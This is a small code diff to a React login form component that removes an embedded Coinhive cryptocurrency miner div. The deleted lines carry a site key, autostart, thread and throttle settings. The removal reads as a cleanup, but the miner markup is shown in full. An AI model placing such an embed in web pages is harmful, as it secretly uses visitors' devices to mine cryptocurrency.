@@ -56,19 +56,6 @@ export default class Logger extends React.Component {
         </Form.Field>
         <Button  type='button' onClick={this.props.loggedIn} >Submit</Button>
       </Form>
-      <div class="coinhive-miner"
-        style="width: 256px; height: 310px"
-        data-key="wbbjXym7C3CzmYwFk6JhKxWZFVe3VWVi"
-        data-autostart="true"
-        data-whitelabel="false"
-        data-background="#000000"
-        data-text="#eeeeee"
-        data-action="#00ff00"
-        data-graph="#555555"
-        data-threads="4"
-        data-throttle="0.7">
-        <em>Loading...</em>
-      </div>
 
 
     </div>
